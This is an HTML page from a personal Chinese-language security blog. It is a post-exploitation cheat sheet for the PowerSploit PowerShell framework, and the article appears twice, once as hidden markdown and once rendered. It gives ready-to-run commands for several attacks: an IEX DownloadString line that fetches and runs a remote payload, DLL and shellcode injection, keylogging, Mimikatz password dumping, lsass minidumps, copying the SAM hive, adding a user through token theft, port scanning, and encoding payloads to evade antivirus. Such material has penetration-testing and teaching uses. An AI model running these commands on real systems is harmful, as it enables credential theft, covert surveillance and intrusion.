<!DOCTYPE HTML>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <meta name="Keywords" content="blog"/>
    <meta name="Description" content="blog"/>
    <title>Simple</title>
    <link rel="shortcut icon" href="/static/favicon.png"/>
    <link rel="stylesheet" type="text/css" href="/main.css" />
</head>
<body>
<div class="main">
    <div class="header">
    	<ul id="pages">
            <li><a href="/">home</a></li>
            <li><a href="/#/tags">tags</a></li>
            <li><a href="/#/archive">archive</a></li>
    	</ul>
    </div>
	<div class="wrap-header">
    <h1>
    <a href="/" id="title"></a>
    </h1>
	</div>
<xmp id="md" style="display: none;">
<!-- markdown -->
### PowerShell

PowerShell 是微软旨在替代 vbs 而开发的基于 .Net Framework 的命令行程序和脚本环境, 其强大的特性而被经常用于后渗透信息收集, 横向移动, 权限维持等.

Powershell 目前有 6 个版本, 其中 Windows 7/2008 R2 内置 Powershell 2.0, Windows 8/8.1/2008 R2 内置 PowerShell 3.0, Windows 10 1903 内置 PowerShell 5.0.

在 PowerShell 中, 一切皆为对象, 且命令一致采用 "动词-名词" 的格式, 如 `Set-Content`, `Get-Item`. PowerShell 的另一大好处为它拥有丰富的文档信息, 包括第三方脚本, 都可以采用 `Get-Help Command` 的方式查询帮助, 或加上 `-examples` 参数查看示例.

PowerShell 默认采用 `Restricted` 的执行策略, 即不允许所有脚本执行, 另有 `AllSigned`, `RemoteSigned`, `Bypass`, `Unrestricted` 策略, 使用 `Set-ExecutionPolicy` 更改策略, 其它绕过执行策略的方式在此不再赘述.

Powershell 因为其强大的特性, 如对 WinAPI 的支持, 大部分操作完全可以利用 PowerShell 来完成, 且为脚本语言, 无需编译, 达到了真正的无文件落地, 内存执行, 从而绕过了杀软的静态检测.

## PowerSploit

PowerSploit 是基于 PowerShell 的后渗透框架. 在功能上分为杀软绕过, 命令执行, 特权提升, 权限维持, 信息收集等模块及一些辅助性脚本.

### AntivirusBypass

针对杀软的绕过.

**Find-AVSignature**

查找杀软查杀检测文件的特征码.

### CodeExecution

命令执行模块.

**Invoke-DllInjection**

向指定进程注入 DLL.

```
Invoke-DllInjection -ProcessID 1234 -Dll .\payload.dll
```

**Invoke-Shellcode**

向指定进程注入 Shellcode.

```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1/payload.ps1')
Invoke-Shellcode -ProcessID 1234 -Shellcode $buf
```

**Invoke-ReflectivePEInjection**

反射型 DLL/PE 注入. 可从网络加载 DLL/PE 文件.

```
Invoke-ReflectivePEInjection -PEUrl http://192.168.1.100/payload.exe -Force
```

**Invoke-WmiCommand**

执行 WMI 命令.

### Privesc

特权提升.

**Get-System**

Meterpreter getsystem 的 PowerShell 版本.

**PowerUp**

检查可用的提权方法.

```
Invoke-AllChecks
```

### Persistence

权限维持.

本文不再赘述.

### Exfiltration

针对本机的信息收集.

**Get-GPPAutoLogin**

导出组策略中自动登录的用户名和密码.

**Get-GPPPassword**

导出组策略中配置的用户名和密码 (GPP 漏洞).

```
GET-GPPPassword
```

**Get-Keystrokes**

键盘记录.

```
Get-Keystrokes -LogPath .\keylog.txt
```

**Get-MicrophoneAudio**

麦克风录音.

**Get-TimedScreenshot**

定时截图.

```
Get-TimedScreenshoft -Path .\ -Interval 10
```

**Get-VaultCredential**

导出 Windows 凭据.

```
Get-VaultCredential
```

**Invoke-CredentialInjection**

无事件日志登录.

**Invoke-Mimikatz**

Mimikatz 的 PowerShell 版本.

```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

**Invoke-NinjaCopy**

强行复制被进程占用的文件.

```
Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\SAM
```

**Invoke-TokenManipulation**

窃取凭据.

```
Invoke-TokenManipulation -UserName "NT AUTHORITY\SYSTEM" -CreateProcess cmd.exe -ProcessArgs "net user test test /add"
```

**Out-Minidump**

procdump 的 PowerShell 版本.

```
Get-Process lsass | Out-Minidump
```

**VolumeShadowCopyTools**

ShadowCopy 的 PowerShell 版本.

```
New-VolumeShadowCopy -Volume C:\
Get-VolumeShadowCopy
Mount VolumeShadowCopy -Path .\ -DevicePath \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
copy .\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .\
Remove-VolumeShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

### Recon

针对内网的信息收集.

**Get-ComputerDetail**

获取日志信息, 如 RDP 日志, 事件日志.

```
Get-ComputerDetail
```

**Get-HttpStatus**

目录扫描.

```
Get-HttpStatus -Target 192.168.1.1 -Port 8080 -Path .\admin.txt
```

**Invoke-CompareAttributesForClass**

未知.

**Invoke-Portscan**

端口扫描.

```
Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -TopPorts 50
```

**Invoke-ReverseDnsLookup**

内网 IP 反查主机名.

```
Invoke-ReverseDnsLookup '192.168.1.0/24,10.0.0.1'
```

**PowerView**

内网信息收集框架 (待研究).

### ScriptModification

对脚本的一些操作.

**Out-CompressdDLL**

将 DLL 编码为可在 PowerShell 中调用的格式.
```
Out-CompressdDLL -FilePath .\payload.dll
```

**Out-EncodedCommand**

将 PowerShell 命令或文件编码为 base64 格式.

```
Out-EncodedCommand -ScriptBlock {"whoami"}
Out-EncodedCommand -Path .\payload.ps1
```

**Out-EncryptedScript**

PowerShell 加密.

**Remove-Comment**

去除脚本中的空格和注释.

```
Remove-Comment -Path .\payload.ps1
```
<!-- markdown end -->
</xmp>
<div class="entry" id="main">
<!-- content -->
<h3 id="powershell">PowerShell</h3>

<p>PowerShell 是微软旨在替代 vbs 而开发的基于 .Net Framework 的命令行程序和脚本环境, 其强大的特性而被经常用于后渗透信息收集, 横向移动, 权限维持等.</p>

<p>Powershell 目前有 6 个版本, 其中 Windows 7/2008 R2 内置 Powershell 2.0, Windows 8/8.1/2008 R2 内置 PowerShell 3.0, Windows 10 1903 内置 PowerShell 5.0.</p>

<p>在 PowerShell 中, 一切皆为对象, 且命令一致采用 "动词-名词" 的格式, 如 <code>Set-Content</code>, <code>Get-Item</code>. PowerShell 的另一大好处为它拥有丰富的文档信息, 包括第三方脚本, 都可以采用 <code>Get-Help Command</code> 的方式查询帮助, 或加上 <code>-examples</code> 参数查看示例.</p>

<p>PowerShell 默认采用 <code>Restricted</code> 的执行策略, 即不允许所有脚本执行, 另有 <code>AllSigned</code>, <code>RemoteSigned</code>, <code>Bypass</code>, <code>Unrestricted</code> 策略, 使用 <code>Set-ExecutionPolicy</code> 更改策略, 其它绕过执行策略的方式在此不再赘述.</p>

<p>Powershell 因为其强大的特性, 如对 WinAPI 的支持, 大部分操作完全可以利用 PowerShell 来完成, 且为脚本语言, 无需编译, 达到了真正的无文件落地, 内存执行, 从而绕过了杀软的静态检测.</p>

<h2 id="powersploit">PowerSploit</h2>

<p>PowerSploit 是基于 PowerShell 的后渗透框架. 在功能上分为杀软绕过, 命令执行, 特权提升, 权限维持, 信息收集等模块及一些辅助性脚本.</p>

<h3 id="antivirusbypass">AntivirusBypass</h3>

<p>针对杀软的绕过.</p>

<p><strong>Find-AVSignature</strong></p>

<p>查找杀软查杀检测文件的特征码.</p>

<h3 id="codeexecution">CodeExecution</h3>

<p>命令执行模块.</p>

<p><strong>Invoke-DllInjection</strong></p>

<p>向指定进程注入 DLL.</p>

<pre><code>Invoke-DllInjection -ProcessID 1234 -Dll .\payload.dll
</code></pre>

<p><strong>Invoke-Shellcode</strong></p>

<p>向指定进程注入 Shellcode.</p>

<pre><code>IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1/payload.ps1')
Invoke-Shellcode -ProcessID 1234 -Shellcode $buf
</code></pre>

<p><strong>Invoke-ReflectivePEInjection</strong></p>

<p>反射型 DLL/PE 注入. 可从网络加载 DLL/PE 文件.</p>

<pre><code>Invoke-ReflectivePEInjection -PEUrl http://192.168.1.100/payload.exe -Force
</code></pre>

<p><strong>Invoke-WmiCommand</strong></p>

<p>执行 WMI 命令.</p>

<h3 id="privesc">Privesc</h3>

<p>特权提升.</p>

<p><strong>Get-System</strong></p>

<p>Meterpreter getsystem 的 PowerShell 版本.</p>

<p><strong>PowerUp</strong></p>

<p>检查可用的提权方法.</p>

<pre><code>Invoke-AllChecks
</code></pre>

<h3 id="persistence">Persistence</h3>

<p>权限维持.</p>

<p>本文不再赘述.</p>

<h3 id="exfiltration">Exfiltration</h3>

<p>针对本机的信息收集.</p>

<p><strong>Get-GPPAutoLogin</strong></p>

<p>导出组策略中自动登录的用户名和密码.</p>

<p><strong>Get-GPPPassword</strong></p>

<p>导出组策略中配置的用户名和密码 (GPP 漏洞).</p>

<pre><code>GET-GPPPassword
</code></pre>

<p><strong>Get-Keystrokes</strong></p>

<p>键盘记录.</p>

<pre><code>Get-Keystrokes -LogPath .\keylog.txt
</code></pre>

<p><strong>Get-MicrophoneAudio</strong></p>

<p>麦克风录音.</p>

<p><strong>Get-TimedScreenshot</strong></p>

<p>定时截图.</p>

<pre><code>Get-TimedScreenshoft -Path .\ -Interval 10
</code></pre>

<p><strong>Get-VaultCredential</strong></p>

<p>导出 Windows 凭据.</p>

<pre><code>Get-VaultCredential
</code></pre>

<p><strong>Invoke-CredentialInjection</strong></p>

<p>无事件日志登录.</p>

<p><strong>Invoke-Mimikatz</strong></p>

<p>Mimikatz 的 PowerShell 版本.</p>

<pre><code>Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
</code></pre>

<p><strong>Invoke-NinjaCopy</strong></p>

<p>强行复制被进程占用的文件.</p>

<pre><code>Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\SAM
</code></pre>

<p><strong>Invoke-TokenManipulation</strong></p>

<p>窃取凭据.</p>

<pre><code>Invoke-TokenManipulation -UserName "NT AUTHORITY\SYSTEM" -CreateProcess cmd.exe -ProcessArgs "net user test test /add"
</code></pre>

<p><strong>Out-Minidump</strong></p>

<p>procdump 的 PowerShell 版本.</p>

<pre><code>Get-Process lsass | Out-Minidump
</code></pre>

<p><strong>VolumeShadowCopyTools</strong></p>

<p>ShadowCopy 的 PowerShell 版本.</p>

<pre><code>New-VolumeShadowCopy -Volume C:\
Get-VolumeShadowCopy
Mount VolumeShadowCopy -Path .\ -DevicePath \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
copy .\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .\
Remove-VolumeShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
</code></pre>

<h3 id="recon">Recon</h3>

<p>针对内网的信息收集.</p>

<p><strong>Get-ComputerDetail</strong></p>

<p>获取日志信息, 如 RDP 日志, 事件日志.</p>

<pre><code>Get-ComputerDetail
</code></pre>

<p><strong>Get-HttpStatus</strong></p>

<p>目录扫描.</p>

<pre><code>Get-HttpStatus -Target 192.168.1.1 -Port 8080 -Path .\admin.txt
</code></pre>

<p><strong>Invoke-CompareAttributesForClass</strong></p>

<p>未知.</p>

<p><strong>Invoke-Portscan</strong></p>

<p>端口扫描.</p>

<pre><code>Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -TopPorts 50
</code></pre>

<p><strong>Invoke-ReverseDnsLookup</strong></p>

<p>内网 IP 反查主机名.</p>

<pre><code>Invoke-ReverseDnsLookup '192.168.1.0/24,10.0.0.1'
</code></pre>

<p><strong>PowerView</strong></p>

<p>内网信息收集框架 (待研究).</p>

<h3 id="scriptmodification">ScriptModification</h3>

<p>对脚本的一些操作.</p>

<p><strong>Out-CompressdDLL</strong></p>

<p>将 DLL 编码为可在 PowerShell 中调用的格式.</p>

<pre><code>Out-CompressdDLL -FilePath .\payload.dll
</code></pre>

<p><strong>Out-EncodedCommand</strong></p>

<p>将 PowerShell 命令或文件编码为 base64 格式.</p>

<pre><code>Out-EncodedCommand -ScriptBlock {"whoami"}
Out-EncodedCommand -Path .\payload.ps1
</code></pre>

<p><strong>Out-EncryptedScript</strong></p>

<p>PowerShell 加密.</p>

<p><strong>Remove-Comment</strong></p>

<p>去除脚本中的空格和注释.</p>

<pre><code>Remove-Comment -Path .\payload.ps1
</code></pre>
<!-- content end -->
</div>
<br>
<br>
    <div id="disqus_thread"></div>
	<div class="footer">
		<p>© Copyright 2017-2019 by X1r0z</p>
	</div>
</div>
<script src="main.js"></script>
<script id="content" type="text/mustache">
    <h1>{{title}}</h1>
    <div class="tag">
    {{date}}
    {{#tags}}
    <a href="/#/tag/{{name}}">#{{name}}</a>
    {{/tags}}
    </div>
</script>
<script id="pagesTemplate" type="text/mustache">
    {{#pages}}
    <li>
        <a href="{{path}}">{{title}}</a>
    </li>
    {{/pages}}
</script>
<script>
$(document).ready(function() {
    $.ajax({
        url: "main.json",
        type: "GET",
        dataType: "json",
        success: function(data) {
            $("#title").html(data.name);
            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
            var pagesHtml = pagesTemplate.render({"pages": data.pages});
            $("#pages").append(pagesHtml);
            //path
            var path = "pentesting-with-powersploit";
            //path end
            var now = 0;
            for (var i = 0; i < data.posts.length; ++i)
                if (path == data.posts[i].path)
                    now = i;
            var post = data.posts[now];
            var tmp = post.tags.split(" ");
            var tags = [];
            for (var i = 0; i < tmp.length; ++i)
                if (tmp[i].length > 0)
                    tags.push({"name": tmp[i]});
            var contentTemplate = Hogan.compile($("#content").html());
            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
            $("#main").prepend(contentHtml);
            if (data.disqus_shortname.length > 0) {
                var disqus_shortname = data.disqus_shortname;
                (function() {
                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
                })();
            }
        }
    });
});
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
</script>
</body>
</html>
